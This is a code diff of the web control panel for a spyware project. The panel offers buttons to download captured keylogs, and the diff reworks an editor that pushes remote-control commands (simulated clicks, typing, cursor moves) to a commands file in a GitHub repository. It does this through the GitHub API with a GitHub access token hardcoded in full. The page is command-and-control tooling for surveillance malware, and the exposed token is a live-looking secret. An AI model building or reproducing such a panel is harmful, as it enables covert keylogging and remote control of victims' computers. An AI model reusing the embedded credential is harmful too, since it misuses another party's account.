@@ -5,40 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>SPYWARE CONTROL CENTRE</title>
     <style>
-        #commands-editor {
-            background-color: #fff;
-            border: 1px solid #ccc;
-            padding: 15px;
-            border-radius: 5px;
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
-            margin-top: 20px;
-        }
-        #command-textarea {
-            width: 100%;
-            height: 150px;
-            padding: 10px;
-            font-family: monospace;
-            border: 1px solid #ccc;
-            border-radius: 5px;
-        }
-        #command-submit {
-            background-color: #2980b9;
-            color: white;
-            padding: 10px 15px;
-            margin-top: 10px;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-        }
-        #command-submit:hover {
-            background-color: #1a5b8a;
-            transform: scale(1.05);
-        }
-        #commands-guide {
-            margin-top: 10px;
-            font-size: 14px;
-            color: #555;
-        }
         body {
             font-family: Arial, sans-serif;
             background-color: #f4f4f4;
@@ -290,76 +256,6 @@
         <button class="download-button" onclick="downloadKeylogCSV()">Download as CSV</button>
         <button class="download-button" onclick="downloadKeylogJSON()">Download as JSON</button>
 
-
-
-
-       <div id="commands-editor">
-        <h2>Edit Commands</h2>
-        <textarea id="command-textarea" placeholder="Enter your commands here..."></textarea>
-        <button id="command-submit" onclick="submitCommands()">Save Commands</button>
-
-        <!-- Brief guide for commands format -->
-        <div id="commands-guide">
-            <p><strong>Command Format Guide:</strong></p>
-            <p>Use the following format for commands:</p>
-            <ul>
-                <li><code>/click x y</code> - Simulate a click at coordinates (x, y)</li>
-                <li><code>/type "text"</code> - Simulate typing the provided text</li>
-                <li><code>/move x y</code> - Move the cursor to coordinates (x, y)</li>
-            </ul>
-            <p>Ensure each command is on a new line.</p>
-        </div>
-    </div>
-
-    <script>
-        const commandsUrl = "https://api.github.com/repos/shrijaybaheti/spyware/commands.txt"; // Path to the commands.txt file in your repo
-
-        // Function to load the commands from the file
-       // Function to load the commands from the file
-    function loadCommands() {
-        fetch(commandsUrl)
-            .then(response => response.json())
-            .then(data => {
-                const commandsContent = atob(data.content); // Decode the base64 content
-                document.getElementById('command-textarea').value = commandsContent; // Load content into textarea
-                window.currentSha = data.sha; // Store the SHA for future updates
-            })
-            .catch(error => logError('Error loading commands: ' + error));
-    }
-
-
-        // Function to submit the commands and update the file
-        function submitCommands() {
-            const updatedCommands = document.getElementById('command-textarea').value;
-            fetch(commandsUrl, {
-                method: 'PUT',
-                headers: {
-                    'Authorization': 'token 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', // Add your GitHub token here
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    message: 'Updated commands.txt from the Spyware Control Centre',
-                    content: btoa(updatedCommands), // Encode the updated content in base64
-                    sha: window.currentSha // Provide the SHA of the file for modification
-                })
-            })
-            .then(response => response.json())
-            .then(data => {
-                alert('Commands updated successfully!');
-                window.currentSha = data.content.sha; // Update the SHA for future edits
-            })
-            .catch(error => logError('Error updating commands: ' + error));
-        }
-
-        // Function to log errors
-        function logError(message) {
-            console.error(message);
-            alert(message);
-        }
-
-        // Load the commands initially
-        loadCommands();
-        </script>
         <script>
             // Download Logs in CSV format
             function downloadKeylogCSV() {
@@ -397,6 +293,64 @@
                     .catch(error => logError('Error downloading keylog JSON: ' + error));
             }
         </script>
+        <h2>Edit Commands</h2>
+    <textarea id="commands-content" rows="10" cols="50"></textarea>
+    <br>
+    <button class="download-button" onclick="saveCommands()">Save Commands</button>
+    
+    <script>
+        const commandsUrl = "https://api.github.com/repos/shrijaybaheti/spyware/contents/commands.txt"; // URL to the commands.txt file
+        let commandsSha = ""; // SHA of the commands.txt file (required for updates)
+    
+        // Fetch the current content of commands.txt
+        function fetchCommands() {
+            fetch(commandsUrl)
+                .then(response => response.json())
+                .then(data => {
+                    const content = atob(data.content); // Decode base64 content
+                    document.getElementById('commands-content').value = content; // Show the content in the text area
+                    commandsSha = data.sha; // Save the SHA for future updates
+                })
+                .catch(error => logError('Error fetching commands: ' + error));
+        }
+    
+        fetchCommands(); // Initial fetch
+    
+        // Function to save the updated commands to the repository
+        function saveCommands() {
+            const updatedContent = document.getElementById('commands-content').value;
+            const encodedContent = btoa(updatedContent); // Encode content to base64
+    
+            const body = {
+                message: "Updated commands.txt via website",
+                content: encodedContent,
+                sha: commandsSha // Use the SHA fetched earlier
+            };
+    
+            fetch(commandsUrl, {
+                method: "PUT",
+                headers: {
+                    "Content-Type": "application/json",
+                    "Authorization": "token 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" // Replace with your GitHub token
+                },
+                body: JSON.stringify(body)
+            })
+            .then(response => {
+                if (response.ok) {
+                    alert('Commands saved successfully!');
+                    fetchCommands(); // Refresh the commands content
+                } else {
+                    throw new Error('Failed to save commands.');
+                }
+            })
+            .catch(error => logError('Error saving commands: ' + error));
+        }
+    
+        function logError(message) {
+            console.error(message);
+            alert(message);
+        }
+    </script>
     </div>
 
     <script>
